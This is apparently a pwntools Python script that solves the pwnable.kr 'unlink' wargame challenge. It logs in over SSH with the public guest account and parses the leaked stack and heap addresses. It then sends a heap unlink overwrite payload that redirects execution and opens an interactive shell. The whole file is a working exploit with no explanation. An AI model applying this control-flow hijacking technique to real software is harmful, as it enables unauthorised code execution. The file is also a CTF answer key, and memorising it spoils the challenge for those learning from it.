#!/usr/bin/python3

from pwn import *
import struct

print('Connecting to unlink@pwnable.kr:2222.......')
s = ssh('unlink', 'pwnable.kr', 2222, 'guest')

p = s.process('./unlink')
p.recvuntil('here is stack address leak: ')
stack_addr = int(p.recv(10), 16)
p.recvuntil('here is heap address leak: ')
heap_addr = int(p.recv(10), 16)

exploit_buff = b'\xeb\x84\x04\x08'
exploit_buff += 4 * b'A' + 8 * b'A'
exploit_buff += struct.pack('I', heap_addr + 12)
exploit_buff += struct.pack('I', stack_addr + 0x10)

p.send(exploit_buff)
p.interactive()


